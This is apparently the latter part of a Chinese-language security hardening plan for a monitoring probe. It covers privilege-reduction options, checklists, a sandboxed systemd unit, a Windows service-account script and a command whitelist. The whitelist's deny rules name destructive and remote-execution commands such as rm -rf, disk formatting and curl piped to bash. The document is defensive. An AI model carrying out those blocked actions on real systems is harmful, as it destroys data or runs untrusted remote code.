  - 配置 sudo 白名单
  - 测试所有监控功能

- ✅ Windows 服务账户
  - 创建专用本地账户
  - 授予最小必要权限
  - 使用 NSSM 管理服务

- ✅ 实施 RBAC
  - 定义角色：管理员、运维、只读
  - 实现命令级别的权限控制
  - 集成到现有权限系统

**验收标准**:
- 探针不再以 root/Administrator 运行
- 只能执行白名单内的命令
- 不同角色有不同的操作权限

#### 第三阶段：架构优化（P2）- 持续

**目标**: 长期安全改进和监控

**任务清单**:
- 🔄 SSH 密钥认证
  - 设计密钥管理流程
  - 实现自动密钥部署
  - 逐步迁移现有节点

- 🔄 网络隔离
  - 设计网络拓扑
  - 配置防火墙规则
  - 部署 NATS 网关

- 🔄 持续监控
  - 建立安全监控仪表板
  - 配置告警规则
  - 定期安全审计

- 🔄 安全测试
  - 进行渗透测试
  - 漏洞扫描
  - 代码安全审查

---

## 六、替代方案评估

### 6.1 是否可以完全避免管理员权限？

#### 方案 A: 完全无特权运行

**可行性**: ❌ 不可行

**原因**:
1. 无法注册为系统服务（自启动需求）
2. 无法采集系统级指标：
   - 网络连接状态（需要读取 `/proc/net/*`）
   - 所有进程信息（需要读取其他用户的 `/proc/<pid>`）
   - 系统服务状态（需要访问 systemd）
3. 无法执行任何需要提权的运维操作

**适用场景**: 仅适用于用户级应用监控（非常受限）

#### 方案 B: 安装时需要管理员，运行时降权

**可行性**: ✅ 可行（推荐）

**实施方式**:
1. **安装阶段**（需要管理员）:
   - 创建专用用户和组
   - 部署文件到系统目录
   - 注册系统服务
   - 配置 sudo 白名单

2. **运行阶段**（普通用户）:
   - 服务以 `bklite` 用户运行
   - 通过 Capabilities 获得特定权限
   - 通过 sudo 白名单执行特权命令

**优点**:
- 大幅降低运行时风险
- 保持功能完整性
- 符合最小权限原则

**缺点**:
- 初始部署仍需管理员权限
- 配置复杂度增加

#### 方案 C: 使用 Agent-less 架构

**可行性**: ✅ 可行但功能受限

**实施方式**:
- 不在目标节点安装探针
- 通过 SSH/WinRM 远程采集
- 类似 Ansible 的工作方式

**优点**:
- 目标节点无常驻进程
- 降低攻击面

**缺点**:
- 实时性差（无法持续监控）
- 网络开销大
- SSH 凭证管理仍是问题

### 6.2 权限需求对比表

| 功能 | 需要的最小权限 | 完全无特权 | 降权运行 | 当前(Root) |
|------|--------------|-----------|---------|-----------|
| 读取进程信息 | CAP_SYS_PTRACE | ❌ | ✅ | ✅ |
| 监听系统端口 | CAP_NET_BIND_SERVICE | ❌ | ✅ | ✅ |
| 系统服务管理 | sudo systemctl | ❌ | ✅ | ✅ |
| 读取日志文件 | 用户组权限 | ⚠️ 部分 | ✅ | ✅ |
| 网络连接监控 | CAP_NET_ADMIN | ❌ | ✅ | ✅ |
| 安装/卸载 | root | ❌ | ⚠️ 需提权 | ✅ |
| 文件系统读取 | CAP_DAC_READ_SEARCH | ❌ | ✅ | ✅ |

**结论**: 降权运行（方案B）是安全性和功能性的最佳平衡点。

---

## 七、安全检查清单

### 7.1 部署前检查

- [ ] NATS 服务器已启用 TLS
- [ ] 生成并部署了客户端证书
- [ ] SSH known_hosts 文件已配置
- [ ] 命令白名单已定义
- [ ] 审计日志数据库已创建
- [ ] 监控告警已配置

### 7.2 运行时检查

- [ ] 探针进程以非root用户运行
- [ ] 所有命令执行都有审计记录
- [ ] 可疑活动会触发告警
- [ ] NATS 连接使用加密
- [ ] SSH 连接验证主机密钥
- [ ] 无 Unrestricted 执行策略

### 7.3 定期审计

- [ ] 每周审查可疑命令日志
- [ ] 每月检查权限配置
- [ ] 每季度进行渗透测试
- [ ] 每年更新证书和密钥

---

## 八、参考资料和工具

### 8.1 安全标准

- **CIS Benchmark**: 系统加固指南
  - Linux: https://www.cisecurity.org/benchmark/distribution_independent_linux
  - Windows Server: https://www.cisecurity.org/benchmark/windows_server

- **NIST SP 800-53**: 安全控制框架
  - 最小权限原则 (AC-6)
  - 审计和问责 (AU-*)

### 8.2 工具推荐

| 类别 | 工具 | 用途 |
|------|------|------|
| 证书管理 | cert-manager, cfssl | 自动化证书签发 |
| 安全扫描 | Lynis, OpenSCAP | 系统安全审计 |
| 漏洞扫描 | Nessus, OpenVAS | 漏洞发现 |
| 渗透测试 | Metasploit, Burp Suite | 安全测试 |
| 日志分析 | ELK Stack, Splunk | 审计日志分析 |
| 入侵检测 | OSSEC, Wazuh | 实时监控 |

### 8.3 开源参考项目

- **Ansible**: 按需提权机制
- **Telegraf**: Capabilities 授权示例
- **Prometheus Node Exporter**: 无特权监控
- **Datadog Agent**: Systemd 安全配置

---

## 九、总结和建议

### 9.1 核心发现

1. **当前实现确实需要最高权限**
   - Windows: 管理员（执行策略修改、系统目录写入）
   - Linux: root（systemd 管理、系统目录写入）

2. **存在严重安全风险**
   - 探针以最高权限运行
   - 可执行任意命令
   - SSH 主机验证被禁用
   - 凭证管理不够安全

3. **有改进空间**
   - 可以实施最小权限原则
   - 可以添加命令白名单
   - 可以加强审计和监控

### 9.2 推荐行动

**立即执行（本周）**:
1. 启用 SSH 主机密钥验证
2. 为 NATS 启用 TLS 加密
3. 添加基础审计日志

**短期规划（本月）**:
1. 实施命令白名单机制
2. 修改 PowerShell 执行策略
3. 创建安全监控仪表板

**中期目标（3个月）**:
1. 探针降权运行（非root）
2. 实施基于证书的认证
3. 完成安全加固配置

**长期愿景（持续）**:
1. 建立零信任安全架构
2. 定期安全审计和渗透测试
3. 持续优化和改进

### 9.3 风险接受声明

如果由于兼容性或时间限制无法立即实施所有改进，建议至少完成 **P0 级别**的安全修复。对于暂时无法修复的风险，应：

1. **记录风险**: 在风险登记册中记录
2. **设置补偿控制**: 如加强网络隔离、限制管理员账户数量
3. **定期评审**: 每季度重新评估风险和改进进展

---

## 附录

### A. 完整的 Systemd Service 示例（安全版）

```ini
# /etc/systemd/system/bklite-sidecar.service

[Unit]
Description=BlueKing Lite Fusion Collector Sidecar
Documentation=https://docs.bklite.example.com
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/opt/fusion-collectors/collector-sidecar -c /opt/fusion-collectors/sidecar.yml

# 用户和组
User=bklite
Group=bklite

# Linux Capabilities (替代 root)
AmbientCapabilities=CAP_NET_BIND_SERVICE CAP_SYS_PTRACE CAP_DAC_READ_SEARCH
CapabilityBoundingSet=CAP_NET_BIND_SERVICE CAP_SYS_PTRACE CAP_DAC_READ_SEARCH

# 文件系统隔离
ReadOnlyPaths=/etc /usr /lib /lib64
ReadWritePaths=/opt/fusion-collectors /var/log/bklite
PrivateTmp=yes
ProtectHome=yes
ProtectSystem=strict

# 进程隔离
NoNewPrivileges=yes
PrivateDevices=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes

# 网络隔离（可选）
# PrivateNetwork=yes  # 如果不需要网络监控可启用

# 系统调用过滤（可选，需要测试）
SystemCallFilter=@system-service
SystemCallFilter=~@privileged @resources @obsolete

# 资源限制
LimitNOFILE=65536
LimitNPROC=512
MemoryLimit=1G
CPUQuota=50%

# 重启策略
Restart=on-failure
RestartSec=5
StartLimitInterval=60
StartLimitBurst=3

# 日志配置
StandardOutput=journal
StandardError=journal
SyslogIdentifier=bklite-sidecar

[Install]
WantedBy=multi-user.target
```

### B. Windows 服务账户权限配置脚本

```powershell
# CreateBKLiteServiceAccount.ps1

# 1. 创建服务账户
$ServiceAccountName = "BKLiteService"
$Password = ConvertTo-SecureString "$(New-Guid)$(New-Guid)" -AsPlainText -Force

try {
    New-LocalUser -Name $ServiceAccountName `
                  -Password $Password `
                  -Description "BlueKing Lite Service Account" `
                  -PasswordNeverExpires `
                  -UserMayNotChangePassword
    Write-Host "✅ 创建服务账户成功: $ServiceAccountName"
} catch {
    Write-Error "❌ 创建服务账户失败: $_"
    exit 1
}

# 2. 授予必要的权限
$Groups = @(
    "Performance Monitor Users",  # 性能监控
    "Event Log Readers",          # 事件日志读取
    "Distributed COM Users"       # WMI 访问
)

foreach ($Group in $Groups) {
    try {
        Add-LocalGroupMember -Group $Group -Member $ServiceAccountName
        Write-Host "✅ 添加到组: $Group"
    } catch {
        Write-Warning "⚠️  添加到组失败: $Group - $_"
    }
}

# 3. 授予文件系统权限
$BKLitePath = "C:\bklite"
$Acl = Get-Acl $BKLitePath

$Permission = "$env:COMPUTERNAME\$ServiceAccountName", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow"
$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $Permission
$Acl.AddAccessRule($AccessRule)

Set-Acl -Path $BKLitePath -AclObject $Acl
Write-Host "✅ 授予文件系统权限: $BKLitePath"

# 4. 授予 WMI 访问权限
$namespace = "root/cimv2"
$computerName = "."

$security = Get-WmiObject -Namespace $namespace -Class __SystemSecurity -ComputerName $computerName
$sd = $security.GetSecurityDescriptor().Descriptor

# 添加 WMI 权限（复杂，建议使用 WMI Control 手动配置）
Write-Host "⚠️  请手动配置 WMI 权限："
Write-Host "   1. 运行 wmimgmt.msc"
Write-Host "   2. 右键 WMI Control -> Properties -> Security"
Write-Host "   3. 选择 Root -> Security -> 添加 $ServiceAccountName"
Write-Host "   4. 授予 'Enable Account' 和 'Remote Enable' 权限"

# 5. 注册服务（使用 NSSM）
Write-Host ""
Write-Host "使用 NSSM 注册服务："
Write-Host "nssm install BKLiteCollector C:\bklite\collector-sidecar.exe"
Write-Host "nssm set BKLiteCollector ObjectName .\$ServiceAccountName <密码>"
Write-Host "nssm set BKLiteCollector AppDirectory C:\bklite"
Write-Host "nssm start BKLiteCollector"
```

### C. 命令白名单配置示例

```yaml
# /etc/bklite/command-whitelist.yaml

# 全局白名单配置
version: "1.0"
default_action: deny  # 默认拒绝

# 允许的命令模式
allowed_commands:
  # 系统信息查询
  - pattern: '^systemctl status [\w\-\.]+$'
    description: "查询服务状态"
    risk_level: low

  - pattern: '^systemctl is-active [\w\-\.]+$'
    description: "检查服务是否运行"
    risk_level: low

  - pattern: '^ps (aux|ef)$'
    description: "查看进程列表"
    risk_level: low

  # 网络状态
  - pattern: '^(netstat|ss) -(tul|an)$'
    description: "查看网络连接"
    risk_level: low

  - pattern: '^ip (addr|route) show$'
    description: "查看网络配置"
    risk_level: low

  # 磁盘和文件系统
  - pattern: '^df -h$'
    description: "查看磁盘使用"
    risk_level: low

  - pattern: '^du -sh [/\w\-\.]+$'
    description: "查看目录大小"
    risk_level: low

  - pattern: '^ls -la [/\w\-\.]+$'
    description: "列出文件"
    risk_level: low

  # 日志查看（限制行数）
  - pattern: '^tail -n [1-9]\d{0,3} [\w/\-\.]+\.log$'
    description: "查看日志文件（最多10000行）"
    risk_level: medium

  - pattern: '^journalctl -u [\w\-\.]+ -n \d{1,4}$'
    description: "查看系统日志"
    risk_level: medium

  # 包管理（只读）
  - pattern: '^(rpm -qa|dpkg -l|yum list installed)$'
    description: "查看已安装软件"
    risk_level: low

# 明确拒绝的命令模式
blocked_commands:
  - pattern: 'rm\s+-rf'
    description: "危险的删除操作"

  - pattern: '(mkfs|dd\s+if=)'
    description: "磁盘格式化操作"

  - pattern: '>\s*/dev/'
    description: "写入设备文件"

  - pattern: '(wget|curl).*\|.*(bash|sh)'
    description: "远程脚本执行"

  - pattern: '(sudo|su)\s+'
    description: "提权操作（应通过sudo白名单）"

  - pattern: '(passwd|useradd|usermod|userdel)'
    description: "用户管理操作"

  - pattern: 'iptables\s+(-F|-X)'
    description: "清空防火墙规则"

  - pattern: 'chmod\s+(777|666)'
    description: "设置不安全的权限"

# 区域特定规则（可选）
regions:
  production:
    # 生产环境更严格
    allowed_commands:
      - pattern: '^systemctl status [\w\-\.]+$'
        description: "仅允许查询服务状态"

  development:
    # 开发环境相对宽松
    allowed_commands:
      - pattern: '^systemctl (start|stop|restart) [\w\-\.]+$'
        description: "允许管理服务"
```

---

**文档维护**:
- 最后更新: 2025-10-20
- 下次审查: 2025-11-20
- 维护者: AI 运维团队
- 审批者: 安全团队
